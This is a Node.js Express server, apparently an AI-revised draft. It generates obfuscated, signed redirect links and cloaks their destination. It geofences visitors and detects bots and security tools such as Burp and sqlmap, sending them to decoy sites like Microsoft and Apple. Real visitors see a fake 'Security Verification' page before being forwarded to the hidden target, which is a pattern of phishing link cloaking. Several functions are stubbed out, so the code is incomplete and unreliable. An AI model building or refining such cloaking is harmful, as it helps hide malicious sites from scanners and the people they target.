const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
app.set('trust proxy', 1);

// ────────────────────────────────────────────────
// CONFIGURATION
// ────────────────────────────────────────────────
const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';
const BOT_URLS = [
  'https://www.microsoft.com', 'https://www.apple.com',
  'https://en.wikipedia.org/wiki/Main_Page', 'https://www.bbc.com'
];

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const GEO_API_URL = process.env.GEO_API_URL || 'https://ipinfo.io/{ip}/country';

const LOG_FILE = 'clicks.log';
const PORT = process.env.PORT || 10000;

const HMAC_SECRET = process.env.HMAC_SECRET || crypto.randomBytes(32).toString('hex');

// Geo Cache
const geoCache = new Map();

// ────────────────────────────────────────────────
// MIDDLEWARE
// ────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'"],
    },
  },
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health
app.get(['/ping', '/health', '/healthz'], (req, res) => res.status(200).send('OK'));

// ────────────────────────────────────────────────
// HELPERS
// ────────────────────────────────────────────────
function isMobile(req) {
  return /android|iphone|ipad|ipod|mobi/i.test(req.headers['user-agent'] || '');
}

const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: (req) => isMobile(req) ? 15 : 5,
  message: 'Too many requests',
  standardHeaders: true,
});

async function getCountryCode(req) {
  let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.headers['x-real-ip'] || req.ip || 'unknown';

  if (ip === 'unknown' || /^127\.|^::1|^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip)) {
    return 'XX';
  }

  if (geoCache.has(ip)) {
    const { cc, ts } = geoCache.get(ip);
    if (Date.now() - ts < 3600000) return cc; // 1h cache
  }

  try {
    const url = GEO_API_URL.replace('{ip}', ip);
    const res = await fetch(url, { timeout: 2500 });
    if (res.ok) {
      const cc = (await res.text()).trim().toUpperCase();
      geoCache.set(ip, { cc, ts: Date.now() });
      return cc || 'XX';
    }
  } catch (e) {}
  return 'XX';
}

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  let score = 0;

  const suspicious = [/bot|headless|phantom|slurp|zgrab|crawler|spider|burp|sqlmap/i];
  if (suspicious.some(r => r.test(ua))) score += 40;
  if (!ua.includes('mozilla')) score += 20;
  if (!req.headers['accept-language']) score += 18;
  if (!req.headers['sec-ch-ua'] && !isMobile(req)) score += 25;
  if (Object.keys(req.headers).length < 12) score += 22;

  return score >= 60;
}

// ────────────────────────────────────────────────
// MULTI-LAYER ENCODE/DECODE + HMAC
// ────────────────────────────────────────────────
const encoders = [ /* same as before */ ];

function multiLayerEncode(str) {
  // ... (same implementation as your original)
  let result = str;
  const noise = crypto.randomBytes(8).toString('hex');
  result = noise + result + noise;

  const shuffled = [...encoders].sort(() => Math.random() - 0.5).slice(0, 5);
  const layers = [];

  for (const layer of shuffled) {
    result = layer.enc(result);
    layers.push(layer.name);
  }

  result = encodeURIComponent(result);
  result = encodeURIComponent(result);
  result = encodeURIComponent(result);

  const hmac = crypto.createHmac('sha256', HMAC_SECRET)
                     .update(result + layers.join(','))
                     .digest('hex').slice(0, 16);

  return { encoded: result, layers, noise, hmac };
}

function multiLayerDecode(encoded, layers, noise, hmac) {
  // Verify HMAC first
  const calculated = crypto.createHmac('sha256', HMAC_SECRET)
                           .update(encoded + layers.join(','))
                           .digest('hex').slice(0, 16);
  if (calculated !== hmac) throw new Error('HMAC verification failed');

  // ... rest of decoding (same as before)
}

// ────────────────────────────────────────────────
// GENERATE LINK
// ────────────────────────────────────────────────
app.get('/generate', (req, res) => {
  const target = req.query.target || TARGET_URL;
  const noisy = target + '#' + Date.now();

  const { encoded, layers, noise, hmac } = multiLayerEncode(noisy);
  const payload = Buffer.from(JSON.stringify({ layers, noise, hmac })).toString('base64url');

  // ... build path and params (same as before, but include hmac)
  const url = `https://${req.hostname}/r/...&p=${encoded}&l=${payload}&...`;

  res.json({ success: true, tracked: url });
});

// ────────────────────────────────────────────────
// MAIN ROUTE
// ────────────────────────────────────────────────
app.get('/r/*', strictLimiter, async (req, res) => {
  const country = await getCountryCode(req);
  const geoAllowed = (ALLOWED_COUNTRIES.length ? ALLOWED_COUNTRIES.includes(country) : true) &&
                     !BLOCKED_COUNTRIES.includes(country);

  if (!geoAllowed || isLikelyBot(req)) {
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BLOCK ${req.ip} ${country} ${isLikelyBot(req) ? 'BOT' : 'GEO'}\n`, () => {});
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${req.ip} ${country}\n`, () => {});

  // Decode with HMAC
  let redirectTarget = TARGET_URL;
  try {
    const params = new URLSearchParams(req.url.split('?')[1] || '');
    const enc = params.get('p');
    const payloadB64 = params.get('l');

    if (enc && payloadB64) {
      const { layers, noise, hmac } = JSON.parse(Buffer.from(payloadB64, 'base64url').toString());
      let decoded = multiLayerDecode(enc, layers, noise, hmac);

      const hashIdx = decoded.indexOf('#');
      if (hashIdx !== -1) decoded = decoded.substring(0, hashIdx);

      if (/^https?:\/\//i.test(decoded)) redirectTarget = decoded;
    }
  } catch (err) {
    console.error('Decode error:', err.message);
  }

  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");

  // ────────────────────────────────────────────────
  // INVISIBLE PROOF OF WORK + PUZZLE PAGE
  // ────────────────────────────────────────────────
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Check</title>
  <style>
    body { font-family: system-ui; background:#f5f5f5; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh; }
    .box { background:white; padding:40px 30px; border-radius:12px; box-shadow:0 6px 24px rgba(0,0,0,0.08); max-width:460px; width:92%; text-align:center; }
    .loader { border:5px solid #eee; border-top:5px solid #4a90e2; border-radius:50%; width:48px; height:48px; animation:spin 1s linear infinite; margin:20px auto; }
    @keyframes spin { to { transform:rotate(360deg); } }
  </style>
</head>
<body>
  <div class="box">
    <h2>Security Verification</h2>
    <p>Verifying you're human...</p>
    <div class="loader"></div>
  </div>

  <script nonce="${res.locals.nonce}">
    const TARGET_URL = '${safeTarget}';
    const BOT_URL = '${BOT_URLS[0]}';
    const isMobile = /Android|iPhone|iPad|Mobi/i.test(navigator.userAgent);

    // === INVISIBLE PROOF OF WORK ===
    async function doProofOfWork(difficulty = 6) {
      const prefix = '000000'.slice(0, difficulty);
      let nonce = 0;
      const data = "verify_" + Date.now();

      while (true) {
        const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(data + nonce));
        const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('');
        if (hex.startsWith(prefix)) return { nonce, hash: hex };
        nonce++;
        if (nonce % 5000 === 0) await new Promise(r => setTimeout(r, 0)); // prevent UI freeze
      }
    }

    // === Enhanced Client Bot Detection ===
    if (!isMobile) {
      if (navigator.webdriver || !window.chrome || window.outerWidth === 0) {
        location.href = BOT_URL;
      }
    }

    // === Run Invisible PoW + Puzzle ===
    Promise.all([
      doProofOfWork(isMobile ? 5 : 6),           // lighter on mobile
      // ... puzzle logic from your original (kept)
    ]).then(() => {
      // Only redirect after both PoW and puzzle are solved
      setTimeout(() => location.href = TARGET_URL, 800);
    }).catch(() => location.href = BOT_URL);

    // Timeout fallback
    setTimeout(() => location.href = BOT_URL, isMobile ? 90000 : 45000);
  </script>
</body>
</html>
  `);
});

app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT} | HMAC enabled`);
});
